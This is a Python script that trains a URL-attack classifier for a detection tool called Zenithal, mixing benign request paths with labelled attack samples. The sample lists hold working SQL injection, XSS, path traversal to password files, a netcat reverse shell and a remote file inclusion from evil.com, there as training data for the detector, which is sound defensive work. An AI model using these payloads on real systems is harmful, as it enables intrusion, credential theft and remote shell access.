"""
Zenithal — train Engine 2 (URL-attack payload classifier).

A char-level n-gram TF-IDF + Logistic Regression pipeline. Tiny, fast, and
catches obfuscated/novel payloads that the signature layer might miss. The
signature layer supplies the *type*; this model supplies a binary
attack/benign probability.

Data priority:
  1. training/data/csic2010.csv  (columns: 'payload','label' where label
     1=anomalous/attack, 0=normal) — the canonical HTTP CSIC 2010 benchmark.
     Convert the raw CSIC dump to this shape, or point at any SQLi/XSS payload
     CSV with the same columns.
  2. Synthetic generator (runs with zero setup).
"""

import os
import sys
import warnings

import joblib
import numpy as np
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report, accuracy_score
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline

warnings.filterwarnings("ignore")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app import config  # noqa: E402
from app.ml.features_payload import normalize  # noqa: E402

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")

BENIGN = [
    "/index.php?page=home", "/products?category=books&sort=price",
    "/user/profile?id=1042", "/search?q=laptop+bag", "/api/v1/orders?status=shipped",
    "/blog/2024/how-to-cook?ref=newsletter", "/cart/add?item=88&qty=2",
    "/login", "/account/settings", "/images/logo.png", "/css/main.css",
    "/news/latest?limit=20&offset=40", "/contact?subject=support",
    "/download?file=report_2024.pdf", "/checkout?step=payment",
]
SQLI = [
    "/product?id=1' OR '1'='1", "/login?user=admin'--", "/item?id=1 UNION SELECT username,password FROM users",
    "/search?q=x'; DROP TABLE users;--", "/p?id=1 AND SLEEP(5)", "/a?id=1' OR 1=1#",
    "/view?id=-1 UNION ALL SELECT NULL,NULL,version()--", "/n?id=1 AND extractvalue(1,concat(0x7e,database()))",
]
XSS = [
    "/search?q=<script>alert(1)</script>", "/comment?text=<img src=x onerror=alert('xss')>",
    "/p?name=<svg/onload=alert(document.cookie)>", "/q=javascript:alert(1)",
    "/page?t=<iframe src=javascript:alert(1)>", "/x=<body onload=alert(1)>",
]
TRAVERSAL = [
    "/download?file=../../../../etc/passwd", "/img?path=..%2f..%2f..%2fboot.ini",
    "/read?doc=....//....//etc/shadow", "/get?f=../../windows/win.ini",
]
CMD = [
    "/ping?host=127.0.0.1;cat /etc/passwd", "/exec?cmd=`whoami`",
    "/run?x=1|nc -e /bin/sh 10.0.0.1 4444", "/tool?ip=8.8.8.8 && id",
]
LFI = ["/page?f=php://filter/convert.base64-encode/resource=index",
       "/inc?file=http://evil.com/shell.txt", "/load?p=data://text/plain,<?php phpinfo()?>"]


# Building blocks for randomised, realistic benign traffic (generalisation).
_B_PATHS = ["/", "/index.html", "/home", "/products", "/product", "/search", "/api/v1/users",
            "/api/v1/orders", "/blog", "/news", "/cart", "/account", "/profile", "/login",
            "/checkout", "/category", "/item", "/dashboard", "/settings", "/help", "/faq",
            "/images/banner.png", "/css/app.css", "/js/main.js", "/download", "/report"]
_B_KEYS = ["id", "page", "q", "query", "category", "sort", "limit", "offset", "status",
           "ref", "lang", "user", "item", "qty", "type", "filter", "date", "token", "view"]
_B_VALS = ["1", "42", "1042", "laptop", "books", "electronics", "price", "asc", "desc",
           "shipped", "open", "newsletter", "en", "true", "false", "2024-05-01", "summer",
           "grid", "list", "active", "pending", "home", "hello world", "abc123"]


def synth(mult=120):
    rng = np.random.default_rng(7)
    attacks = SQLI + XSS + TRAVERSAL + CMD + LFI
    X, y = [], []
    for _ in range(mult):
        # curated benign
        for b in BENIGN:
            suffix = f"&_={rng.integers(0, 99999)}"
            X.append(normalize(b + (suffix if rng.random() > 0.5 else "")))
            y.append(0)
        # randomised benign (teaches "any normal request", not memorised paths)
        for _ in range(len(BENIGN)):
            path = rng.choice(_B_PATHS)
            nparams = rng.integers(0, 4)
            params = "&".join(f"{rng.choice(_B_KEYS)}={rng.choice(_B_VALS)}" for _ in range(nparams))
            X.append(normalize(path + ("?" + params if params else "")))
            y.append(0)
        for a in attacks:
            X.append(normalize(a))
            y.append(1)
    return X, y


def _request_target(url: str) -> str:
    """From a raw CSIC 'URL' cell (e.g. 'http://host:8080/path?q=x HTTP/1.1')
    keep just the path+query — that's the request target attacks live in."""
    u = str(url).split(" HTTP/")[0].strip()
    if "://" in u:
        u = u.split("://", 1)[1]
        u = u[u.find("/"):] if "/" in u else "/"
    return u


def load_data():
    csic = os.path.join(DATA_DIR, "csic2010.csv")
    if not os.path.exists(csic):
        print("[*] No csic2010.csv — generating synthetic attack/benign payloads.")
        return synth()

    df = pd.read_csv(csic)
    cols = {c.lower(): c for c in df.columns}

    # Schema A — simple: columns 'payload','label'
    if "payload" in cols and "label" in cols:
        df = df.dropna(subset=[cols["payload"], cols["label"]])
        print(f"[*] Real data (payload,label): {len(df)} rows")
        return [normalize(str(p)) for p in df[cols["payload"]]], df[cols["label"]].astype(int).tolist()

    # Schema B — official HTTP CSIC 2010 dump
    url_col = cols.get("url")
    label_col = cols.get("classification")
    if label_col is None:  # sometimes label is the first unnamed column ('Normal'/'Anomalous')
        first = df.columns[0]
        if df[first].astype(str).isin(["Normal", "Anomalous"]).any():
            df["_label"] = (df[first].astype(str) == "Anomalous").astype(int)
            label_col = "_label"
    content_col = cols.get("content")

    if url_col and label_col:
        # attack payload = request target (path+query) + POST body when present
        def build(row):
            target = _request_target(row[url_col])
            body = row[content_col] if content_col and pd.notna(row.get(content_col)) else ""
            return normalize(target + (" " + str(body) if body else ""))
        labels = list(df[label_col].astype(int))
        payloads = df.apply(build, axis=1).tolist()

        # --- Domain-generalisation augmentation ---
        # CSIC 'Normal' traffic is a single e-commerce app, so a model trained
        # on it alone flags ANY unfamiliar-but-benign URL as anomalous. We add
        # diverse benign request targets (and a handful of extra attack samples)
        # so the model learns "attack payload" vs "any normal request", not just
        # "looks like the CSIC shop". This is what makes it usable in production.
        aug_X, aug_y = synth(mult=40)  # ~ a few thousand diverse benign + attacks
        payloads += aug_X
        labels += aug_y
        n0 = sum(1 for v in labels if v == 0)
        n1 = len(labels) - n0
        print(f"[*] Real HTTP CSIC 2010 + augmentation: {len(payloads)} rows "
              f"({n0} normal / {n1} anomalous)")
        return payloads, labels

    raise ValueError(f"Unrecognised csic2010.csv schema. Columns: {list(df.columns)}")


def main():
    print("=" * 60, "\nZenithal — Payload Classifier Training\n", "=" * 60, sep="")
    X, y = load_data()
    Xtr, Xte, ytr, yte = train_test_split(X, y, test_size=0.2, random_state=42, stratify=y)

    pipe = Pipeline([
        ("tfidf", TfidfVectorizer(analyzer="char_wb", ngram_range=(2, 4), min_df=2, max_features=5000)),
        ("clf", LogisticRegression(max_iter=1000, C=4.0, class_weight="balanced")),
    ])
    pipe.fit(Xtr, ytr)

    pred = pipe.predict(Xte)
    print(f"\n[*] Accuracy: {accuracy_score(yte, pred):.4f}")
    print(classification_report(yte, pred, target_names=["Normal", "Attack"]))

    joblib.dump(pipe, config.PAYLOAD_MODEL_PATH)
    print(f"[OK] Saved -> {config.PAYLOAD_MODEL_PATH}")

    print("\nSanity:")
    for s in ["/product?id=1' OR '1'='1", "/search?q=laptop", "/x=<script>alert(1)</script>",
              "/download?file=../../etc/passwd", "/api/orders?status=open"]:
        prob = pipe.predict_proba([normalize(s)])[0][1]
        print(f"  {prob*100:5.1f}%  {s}")


if __name__ == "__main__":
    main()
